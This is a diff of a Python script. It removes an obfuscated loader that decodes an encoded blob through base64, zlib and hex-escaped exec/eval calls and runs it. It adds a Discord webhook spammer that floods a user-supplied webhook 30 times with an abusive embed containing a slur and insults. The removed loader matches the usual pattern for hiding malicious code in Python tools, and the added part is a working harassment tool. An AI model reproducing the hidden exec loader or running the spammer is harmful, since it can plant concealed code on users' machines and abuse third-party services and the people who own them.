@@ -1,9 +1,93 @@
-#pip install pycryptodome
-import random ,base64,codecs,zlib;pyobfuscate=""
+from dhooks import Webhook,Embed
+import sys
+import os
+import time 
 
-obfuscate={'(https://pyobfuscate.com)*(binascii)':'''!SL2{G2mg`&goA8zvcrLV)NY<qOz*i)=9)a_<XU32$f}w+`huW^yqPJ7~R;jb;S<f8zge7vm!cNE+`=dB?CTXHPP_f11xf}dWXrL{wHK@#=W^hvVh0;W`%`Z-N{zH>gEw#kOJJ>uVgnQ)^|{CD?a#sXe`1kS0EbUk0jze22o9}@#7``D4hg<gkrYQq?drSN?ea($S-HpX7#2&axAlU_nKUD`PqUL;%F-?##zlLJ5n@r+~G2r@Z)<nq*IBJ^j`T|)b1|;VSQb0R{A2FGmIfO!=);~>4HGL67~OmOLJxKgl*q#UIP|4Ew~JpV|L7Wg5o_{&SgfBx)8(DMFXqigeoU7Q53mx;HQ)BBPbJ5+A99wI95}E57Y!^WlO*6!0rxK+e~QPtu`V%j6v}$@!;4FQUb;g@Ws5oOl^m8Cb7AHmEj~!av{i(;2?x?RFDz6;z$v0>9@uQF=a#^0~*o$H*h?2B)!yDw1<H9#If2V*Jf}guHUMyRNW=*VIHqK#GKdO1*h-SFc2d^#6C*el+ds|8BS~io(wt$C5EtWwkkcdHF9YOyt3e6tu}o%Z1`7lz_$R7hnUNyA%iMYU)}^nEmvBe>Q7r?Ykn1zPM8GmO|AL0Mp#ugXJD$sKYOPu0E<K^Y{8EKelksTR9WSzE|}C*WG^c?$8oj`^(9GgjdE)w908hE|9vMGX*@aEB1y2sL#h{jzPB6hgR`XX`WOHU|9;`TzW`~xq=*E#(3Zo%5zCpQ^PyySC=Zk?Xcn*b@2^z~=k=qo)<q^JwvGB1Up8UjL0+Bb*yvPfd5`G5hHubVohM;OY3UuT$|j#$W+cfm&;|JF9)fUPOWt^){w1V7`6SzGW9bHC5fvX#f}co3XKt4w(cZ-?F_+eszzX)ISImaqg|-M`lADc66lcJ%v#R`y5-l~z*r==86pGLA&AvRjRKq{8+_r{|?r>2s+J~Bq55M~XHtH*~cZEK*mO{xMb;XG9;ps)$`E-37jwY?&Isvl5#TY<P7*fg=ni<baDPOTR`_%WtrTT5Z=`*nIG<Pxg2^M-%tvHvFf^;I)(*5y0m2diBfppCTd%wELCbk;ZT$z!dy*eEvKst|ul?S^p95(9bl<xr@W78VC2gdLRIP}aObNn+Fww27NG>58!Ug<>cfB2|_tlZwR0Ao3(u&&P8N>5;~vX4We<0WzOy!bY+_7*m%#b?a-fUh^s+_C#;Gne@ET3QA7*6rB>5ps<9c_I@VV)3N=T)^-=qKjZkBQ)9#Jr=N?JVbsS<#kM!j+=tmr(GNP!;o?ZxWo6p{bbVGciT@&LTtm2WH2@Bufk1fEj@&49=166)m`n?U%%~&N6Id8+B+u5RnM+75$peN|0l(hScgZD&2#SmfZjUvxI9<d)2yeQXTK5Q(>a~Ju)2EgG3SnG4~`5}pIR!niGL!muedr;yY)5NGygwTooiByXs=gVpibqcOu$U$QQmh+pQH*UPI>^+V1wqhE^XVQ{PHGsHXHJYL9XFZX47~AIF<L0aYNqxx^lrmbS-ZaA5vUuGjoW(E%MVQ5})sjOSMiG3U0uF3-dJtOU-N-sQZUV3r_RXm;^5&4f@HnWSWG-VaO3vr^&R`EJFT*f>2jMBXsF+5$ETVtmGqhB!mj@V#b==rlFENesOK`TOnpWhAGah{NYm)4bX)P2%@1-p_)8wfUj`iMvCt(ZFLAu;61}tkk3HqKGWu|?XW~-b;+thG=vcg(|H*`@<RhI6<Zf)N9v<*(rTs4U{HD@$)TvM5hw3&5z|Yb-;9cndLw|X29YE%br=}$uUm}h-F-mjpIc*6TWcX^8%NRV9V9j8cmGYI5NS#U{2_VE`|J067gNz>71UbUcFj;F<Up%j^^|0u8G7Oh5!){!(}Yeq<HEzRK-ro7j#Kn8rM-8KHf8#KMWwpDIg1uWKe&SUGTL$_FY+N^f!cxUmT2Q@enm1a7V+=qctVw+q8Fj%j0KqKAEu=n^;X`t7bR<$-}SbLn1mQh%NK`xK*n4eU-#gO!)-;4+?0NTz+ap9;2Q*_=&ABRhn}E|;c}JO*N};$R}K5Hmp|tDMwxEz*syib%=hcKGag&$&3uUReRq#+2QWM6%rcWrNsn@YD5ZM%dK7A5J9cu$Cgkkr_L)$}TO#@EEHHk%11mIhF?Dn%k`o)Y3O6Uv3F-ezMjM54JBW%|IUkB4m7=;&g!nuzufp2WldNhwP8rPcoU$L<Wwo?O0f&x~>E+t&gz>7?LhQf+q!c|&B`&?{-tWDPXX5Dk7(B+x;hy|l{@y}?OHg$)R<fk=c4z%>PO+Wyy(VMUaM(}t=pe_%Y64@>-DR&iuN|Nq00B?9e^f+PhyMb(e5_WLhOsk)3AqDO(z_iW6yuo3gxtWq%Mz+3b&7<<fcTe9Vi_F4+Mu(xwNO*(W?*pC^2vuSoUEuUgg9wwNKDE$gmR@Op-JMudxQ~#X^NI8Q<nEM6#$bT!R?1T4vTNvm3ZC}X0<E~gJl^$b5-`a`(M1eNgA9HkSiZZ{aUkpp;6_abSEvApBm*Q=OXgRrr=OL6&DiaIaSLexZsV6W>I<i<Z702Ad(Zv)S9uPg{lX0L8yVd@Jj#Wfn$sZFM=W$b_=ofmEw7{I#fpq6&+UUHonchLgK`cZ^q@TB~XkRZ4ETlrHInyOG$l26+hikG6izt?I8~a@|&zLQH8vFym)~$G??B&T^}c0?i!WmnIv5-lx<{kvP0mSZGOBY&(}?J5CDZ#m^4VJ87)})b!p%L86i7Bn4)|rO8VRcECsTUb$6#bAIXkjwXuTpmxfVh=5s`f8`O?-^ddX#YgcCQReJv<Pa_vs+QRUKnX&Yl?+IL7;3bYo&iFc51I=Bkd|-8@?1bD=70*xg3-n+l<0P=dptFhunD(ShBfCM|*NWfz_3PgMj(<*ZIr9F59DTwjB!e57I-T83#k-z>&YOQp>eTZzRkYZ>?J6;NHW7LvCP=jfcr63BJM@eb1d~Pl%&i3;ccFy}*?!tk^@whlcWfaVXPNG&TP{hlxsmp`@?Km3*#$$fX%#|FtR2>?3~XFb5_(0+Z*P9%aP9UpJLqBcQ|!^gRx1@mOR%tmBwU>AYR8Yl^6DT&qYx8^ZetpE^*9gwwpU8c4$<|1&dL~#L+R1I64k;0V{odYLMV4Hc%tul{aD{>8V1`kW{z+Z*yF^lc?wq_9}e<Rik<EcenaO*Kz(?OgA#YIz&8KfVv5S5ijyBw{pWo$9{QPvwMW;D!vF0TZaGzuIS@jv+%fh^=il|Tjx7(^Tc740*UWhUhPb>ZKL9u4AE!<b^sY-P+3#@2X&+-RK&nB_8Njnyso+Wdku~Totq5eYaukRStqAGow19ivG3umQq-_4naxrM<;aNbo9#hJ#f7R;?PExJP|Ln3t#wILnzq%yk8eb=MFph)UFAPz=iUAUS|L&epca}?oE2bOh+S|Bc0(A@S2IzST{~n@mc@@cvN8z#5a?CTneppS-+&u(J%|7oJ!NT>$AxwSOEV0X--RpvwmEAX-L+JLFTJFz<f>jISb5TN3DDKfPyB`<Iin;>z;_25mO)cLEB3hUwQ*F5&rW;p8qzL*L-lbK^abFJdLC{<`@ib_62%549*wx<c7rX3BBv6i-^zm_j)MNvnWaUams*d4qi0d`Ys7^@t?MUqqFskNFBJzqHfsV5yElUE{)^$3tNu2QFoKngWd*i~wpfrs%cD^vu8Lr!sQKHZ^(dQhy>d*4Xs-2-ZHFcL`bQQAUiFvlNIYAR6gY#i77e2Z@mbK;rk#z4`Xq&$Wv<r`s#VZ6!Q)synCK9&;@|7RJ9Wip2c1?l7A)%!JE!8E=_y6A$+uf0F6euxZs;`fOFfbh6%UHF?FA!Kg$9|uNd<N2$DF^_^=Oo9W97ipB`QVGVZ3VKeA{ry&H>z_w+T2yUr+`9QJ+QNmp5iWo!Lg8>;t}CC?1(9H!^%EUq8EfDah4mZpvsx)LE5fX;+@}lIw@%(i3{tX)a;b1GAAa^4%#L@4{r7iy@t+AVT(N&Gp3Y>X=yi}HwKam=X}vZdSQ&(I0<IVWwF2R6o*MUPAidke)zx)l0{QrehXuYSYACi8yeDo6o3>{h*-nOB6!Bw<eQ2(+4ptf!wKr_Xkw7DG1XqtAY?@@tLtW@s!%QqO)~p`nof2qijnTKN%_S>XHM0mh&4Yw{u|R|%xsZw9e(2h3u9D>Qz=1wI{9ait2X2dxx}CffVzR>st130uzKXyyDiT_eG!ic2`TUQ9nC>0YVL^Y#|$u>k7h?l^{?RLYqIbWZp3!8W18Lo#~+Mcc9a(QAx<A(q=A@jSH3z05PQ5-9Dhx+9Fs2UyU;BEufj7B^D@jQXOLBI0`*oK*hP9o4OLBL1^(8G2RS(bIVyHwcSC!*2XU9hFLfP)hXXe$B`#)0fIx%+3P8N1Fic1b9vHDcS)?`bP*UqiY0sIyfdVmQ5NkTr#1mQRU%bn}gNyp-lQ}WG@7I)F5Z71muN_LT%L-Bo93cQ=T^QQU*J|@iBW?s?g9Xxu-O(M|q~EXtq;q~v48!tl7lUt%Jl39Jnzzsdbn38z>U{)*=Kspuq#QV-JE!%1h|I2yp72c+Qk(mJ4dN7=W&1nfU!6-SE33UjDK-C#?fBByc&vQxQ}qRr@2+r2*OFEdZPo=BxkTq<sD|WY0m*%r|4BA$@TENUUW9xX{T954j&KL%O41>SHH*DS5;IkyQnN-qv*=3VF^6%!>&JMU&&Z>wy(Sm!Iq6z7h+vzl0Soy~@|A%f<O^<D`j~kX8%DQ%Yr5(zWb(u^ZGnazuGpUkq-|ra;o|WPPk-Ap0uGeJ7S}nNn_Y)Iks+`re$GO_1KfHQf?U44NSSGJ>1n_jMm0M>HvN04C@)dq&BpGdq{@)o1fmV|e;MCYTHz9qa{rFx?N}(TKNor6Z<zs((@WplJlpfP73#wGd?D4aU!p}344~pU$%6*FkMaS|IvOx4=0Yv{a@keaeD8Z=tu;M2$$7&t@M#M5i(x!$E$d<~;Bey}mm+ZI#ma@N3YYSrnqwseJ0K0L2=3-k&NDU-
-fq!6Y{H*F(`l-H6i$lQa1cU013VZ*ndO0y-CXIr41a7LJ2uq(}N<1qy$Me(RgP9C&=Ivu>^1Y3aZD4Ix*IXvU9W~06t0+O{K2qwrb9dbo;2Ig=c}ubV6|SyXsiy8sFs@fZx(aj;B<B#MEEb=7Eo0vp;G-`2?*gB@e=@UN?L%bLwVyS5hEHf|T~VjG>?9RT%JZL6oWRc~hl#XfDhRQarntXWC*V4ylMues9vE+x1Crs=#JR3$fQ^fOel%jKKY9q`ks4j76I7B3rCrZCKZU7ZK;P1VG|T+05RH`^AURgiL=(>jPJDfh_H#RAyp;x5hZz0set9SWjQ8vKkUm0d3SR@=je7-yG1Ur6iQ6VvOctzF3~iox)d{u70id~<`@oP<y0K8FOfA6mPM<V^`1!@6a`U41Zh6=0^j^iDrT?j2r}1@khM49~EElO={w}x%;_fOP=3YNi6gAi3HRAW<wO6Q{A@b30fwG1B8f%O|h`Q{#GBQaGt!7_A&y=>6{p!+MKNc~<JC<T>i41?iZ&?4G4sGb$PLR+TY0nS_%r67GgS{w~d$f3Wb-7K@9cuEgMrO%5>EB8D?4^>UV(?sR(<{rwIf5TsfIXUi@eMj$(`_o69hW!m-va0g2s^@^0$J)-Th<Xr#-;m*^q{GjRHk<C!F00vZ}8avUffHlx4H_g;zfp}J<*tmsmXH3kB5D`PP)94*^w8&66y?p!GY&A<)|?HZ8t%ROZb%6M)bD^FLk+;@Yf--=R^6*oQP^X_6kt1lS!wwo*~RhD|C-Ee^h;}XO(7`nVTZ7k<{0?^nzAQ;{~qP`T-clTWoYtF89)w8VfVz2t2CKkn=l}b0+1msx0V<Td}ot`WRt>GBVAyd(?KlHlHmChL%xhxXKkg)mP5Zf{+|I3k!!^!)vsVPCRywLIDkiK+2bsG{x%bE)A(K%LV$RElM^gwT?W}joh~0REsE6uGXb$;Z?D?Gl*W)`<8KP=fhz_Xi$_3)<W$ym=Wx%8t}EXjamA$b-sgw0w046qm6v~rt=l}9t$u7h~$`Y49`yb8*cN+91m|XC4xdHu=-@s{Uu=o^{!m10%9FWtZ1MGJS>OOL1y*C_KR78Ji#nqf$qSIOWkJ!S|dBiSiY*<Uyuw4Ac}UIYa2<p47hZSKwdP0@-4_A)`4g^EUga?3vF)~@So~AjCxP-{m>4NaXAP+n>pjj>>?}`K?a$q3q_`IlT;aDPffZphVAyhH2VX@EFxCo62p&nhx&Uy3(#7o7#EX3<bZMS=+Y3SY-86RUwRNp_fY4R&`Im5p;G60uX_mOsAOI(qk^A(LVfq?z2V*=7w2O0`y1_o!{(++c0-8Cfs=i+&ROaSDqRMEx~wB0%0c`sdd_04p)`=mBp_c!nCA3pWOlsxysd2zzfYsDxWMhap}f{H10^bi_rLFuF0NeadsAIRbpn~c<<D!Y3S`B`Y<%+98il)oYUHj60K6w33>3)qbGekZVHqUDo@U=Y-uNW5{XGgAUR@1n&2_g~l?rG~6B`PsufQpd8a>~^Z?0gRtT}{7z~c'''.replace('\n','')}
+from colorama import Fore
+from os import system
+from time import sleep
 
-_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='506170 8610796 2930370 2726977 3634338 143530 1681536 663584 864160 1935040 5247900 3896634 1751136 7175470 3094080 10588320 4704378 10789240 4547439 6151607 8791865 7962240 10324470 1501376 3881325 1894202 5693184 9865569 7740714 8220688 2357312 6839509 2973743 8261172 35050 2349260 3765480 4688145 4347141 1063776 7357532 390514 466290 2512352 2311008 1470464 192544 8607375 4544650 7045584 300807 7868048 1455680 979744 1971984 2967510 1667680 857152 4617480 10835110 8071620 10429096 3316818 7081128 537084 1253696 6968934 2124131 7023402 2290158 4036162 8646045 2750824 10550100 82912 672888 2706330 280336 5884794 849006 5095880 5526670 3120704 2893246 989120 7955164 8876789 4708314 968128 6738672 9360408 2627008 3358506 8990280 2343915 3277116 2237200 3884135 50500 824160 3023872 3028832 2239456 8690505 5934080 3950940 6105199 4080608 7805298 308370 2046704 5854755 9038680 1297960 3705117 3765790 10534139 8961835 509691 938818 4033602 8216148 1302720 689955 8298872 885120 1553531 733460 508660 1847730 6748596 3070008 1983315 8044885 9314130 404935 267232 3802416 6876366 8008988 2956305 5033005 2335080 419798 626544 5432689 7711459 8703747 6687816 9214835 4991364 269560 2434128 1410400 4446820 3374898 70094 1632120 3527680 3066460 5089448 2167576 11406628 2595488 5458590 4115100 3127991 562449 618240 2324652 11049273 4392752 9763236 4994379 10939260 3885453 2093842 8614392 7980010 2849608 4342338 10047276 7884842 2172058 5639289 9687819 1866105 4218890 6420136 5256120 1078336 1750048 4070111 2749926 10190716 4697510 1630080 1414040 964010 8380768 2784222 12043372 4842304 553750 2956896 2307808 2336480 1559552 2418114 9073260 3478074 3145958 2925024 9639462 3046580 2056568 2601984 5641423 3289760 5704608 688384 1023855 7084346 4267984 7743138 5064906 10677452 3013792 3253513 1574880 6295275 8649840 9910692 5089900 1671744 8770449 9444720 2342816 7060203 4263720 666950 552352 2291264 1492608 2270496 1379652 10471698 9587292 3605393 1075392 1490730 236325 1497920 6760530 1769070 10543904 2646018 2191992 9167364 311392 602962 3038686 2706976 2096255 10432070 2286840 2949696 5992369 11143500 2696544 2191016 3092620 2237268 7939644 4306438 8642392 7172487 1618842 6242911 345320 2924096 1206272 2111040 2697568 1915812 10544778 8328771 4597570 1036798 1239472 2438520 3150771 4328870 537040 2208560 6664816 1761500 2388960 5884970 2631408 3218582 576076 2347744 386855 3340177 783432 3942831 4356990 2609455 2402542 6614340 7507994 1293002 10371620 2304646 10786376 4503600 7600204 1184560 4288238 8167040 4317600 4733600 10504404 4700073 9131166 188856 1156238 5146848 3323670 6846525 2802136 1905458 1274144 7641960 3197888 1679940 116320 700920 1576896 2516288 1338368 980992 40320 4056642 2199808 2389761 6060840 2916280 5861296 3676470 1465873 4313920 3080500 6166860 8371476 6442137 9376537 2185730 188530 2840416 3054208 373408 1253088 3126208 3068768 1995552 1729536 9748710 1837594 6368761 10585404 426806 6229579 1304200 10288208 170177 1516098 3670 1082624 1349856 529408 2128128 4513005 890766 2258464 366832 9057840 466080 1119328 3945950 1873577 4486977 1800964 1399440 799571 2412612 11137405 2694074 4492042 702480 362112 1788320 2826528 1537408 1482240 875648 1747168 862944 5264084 1489740 3779280 7537920 1059104 3813960 10124688 7708017 7156710 1502560 10362765 5593636 2837688 1565280 8516032 3318650 3434529 1454640 726614 1542002 929798 980802 902816 373547 10597365 2047872 7701351 3077538 2843049 4596090 1229627 3692118 7729155 2346448 4555908 2101200 9099950 10648336 9079644 132520 3513084 5703912 3831081 841115 957390 1050528 1806272 1107520 338016 7164536 6425400 1744270 7484400 708520 5111217 1998640 1815879 1617550 2552440 9807280 2901650 1005771 2029060 7651794 1321686 3684060 1799500 2718120 3337400 1675137 753590 900512 849888 75328 811456 465000 6194633 3791520 3227796 352389 8957536 6474656 5710274 922370 824288 592256 2698176 289632 2846079 647160 993739 8609832 2332480 1479000 1486404 598600 956000 241910';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdHfJdnL3y43KLTCMCvQzdXIvyIrK9cgFAF/xB/E=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
-   
-                
+
+system("title " + "WEBHOOK Spammed")
+
+os.system("cls")
+def SlowPrint(_str):
+    for letter in _str:
+        #slowly print out the words 
+        sys.stdout.write(letter);sys.stdout.flush();sleep(0.03)
+
+panel="""
+$$\       $$\                              
+$$ |      \__|                             
+$$ |  $$\ $$\ $$$$$$$$\ $$$$$$$$\ $$$$$$\  
+$$ | $$  |$$ |\____$$  |\____$$  |\____$$\ 
+$$$$$$  / $$ |  $$$$ _/   $$$$ _/ $$$$$$$ |
+$$  _$$<  $$ | $$  _/    $$  _/  $$  __$$ |
+$$ | \$$\ $$ |$$$$$$$$\ $$$$$$$$\\$$$$$$$ |
+\__|  \__|\__|\________|\________|\_______|
+                                           
+ $$$$$$\                                                                      
+$$  __$$\                                                                     
+$$ /  \__| $$$$$$\   $$$$$$\  $$$$$$\$$$$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$\  
+\$$$$$$\  $$  __$$\  \____$$\ $$  _$$  _$$\ $$  _$$  _$$\ $$  __$$\ $$  __$$\ 
+ \____$$\ $$ /  $$ | $$$$$$$ |$$ / $$ / $$ |$$ / $$ / $$ |$$$$$$$$ |$$ |  \__|
+$$\   $$ |$$ |  $$ |$$  __$$ |$$ | $$ | $$ |$$ | $$ | $$ |$$   ____|$$ |      
+\$$$$$$  |$$$$$$$  |\$$$$$$$ |$$ | $$ | $$ |$$ | $$ | $$ |\$$$$$$$\ $$ |      
+ \______/ $$  ____/  \_______|\__| \__| \__|\__| \__| \__| \_______|\__|      
+          $$ |                                                                
+          $$ |                                                                
+          \__|                                                                
+"""
+print(panel)
+
+spam_work = f"""{Fore.RED}
+
+ $$$$$$\                                                      $$\                          $$\                     $$\ 
+$$  __$$\                                                     $$ |                         $$ |                    $$ |
+$$ /  \__| $$$$$$\   $$$$$$\  $$$$$$\$$$$\         $$$$$$$\ $$$$$$\    $$$$$$\   $$$$$$\  $$$$$$\    $$$$$$\  $$$$$$$ |
+\$$$$$$\  $$  __$$\  \____$$\ $$  _$$  _$$\       $$  _____|\_$$  _|   \____$$\ $$  __$$\ \_$$  _| $$  __$$\ $$  __$$ |
+ \____$$\ $$ /  $$ | $$$$$$$ |$$ / $$ / $$ |      \$$$$$$\    $$ |     $$$$$$$ |$$ |  \__| $$ |    $$$$$$$$ |$$ /  $$ |
+$$\   $$ |$$ |  $$ |$$  __$$ |$$ | $$ | $$ |       \____$$\   $$ |$$\ $$  __$$ |$$ |       $$ |$$\ $$   ____|$$ |  $$ |
+\$$$$$$  |$$$$$$$  |\$$$$$$$ |$$ | $$ | $$ |      $$$$$$$  |  \$$$$  |\$$$$$$$ |$$ |       \$$$$  |\$$$$$$$\ \$$$$$$$ |
+ \______/ $$  ____/  \_______|\__| \__| \__|      \_______/    \____/  \_______|\__|        \____/  \_______| \_______|
+          $$ |                                                                                                         
+          $$ |                                                                                                         
+          \__|                                                                                                         
+
+"""
+
+
+embed = Embed(
+    description='STOP SENDING LOGGERS SKID  GAY :sunglasses:',
+    color=0x5CDBF0,
+    timetamp='now'
+)
+
+webhookk = input("\u001b[32mEntre l'URL du webhook: "f"{Fore.RESET}")
+os.system("cls")
+hook = Webhook(webhookk)
+
+image2 = 'https://i.imgur.com/K7hZxcm.png'
+image3 = 'https://pbs.twimg.com/media/Bpvdm-QIgAAsoX5.jpg'
+image4 = 'https://i.imgur.com/uAP2Ctf.jpg'
+image5 = 'https://i.imgur.com/IY3kK8M.jpg'
+embed.set_author(name='By|kizzouille#6969| You are CLOWN ', icon_url=image4)
+embed.add_field(name='YOURE A FUCKING CLOWN', value='NOOBY NULLOS SOUS MERDE')
+embed.set_footer(text='FUCK YOU', icon_url=image3)
+embed.set_footer(text='ur so bad', icon_url=image5)
+embed.set_thumbnail(image2)
+embed.set_image(image5)
+
+#spam pannel show
+print(spam_work)
+testboucle = 0
+while testboucle < 30:
+        hook.send(embed=embed)
+        testboucle += 1
+        result = str(testboucle)
+        if testboucle % 10 == 0:
+            print("Succesfully spammed", testboucle, "times!")
+time.sleep(2)
+SlowPrint("\u001b[31mRestart for more spam!\n")
+SlowPrint(f"{Fore.RESET}Credit to kizzouille | Have good day !")
+time.sleep(3)
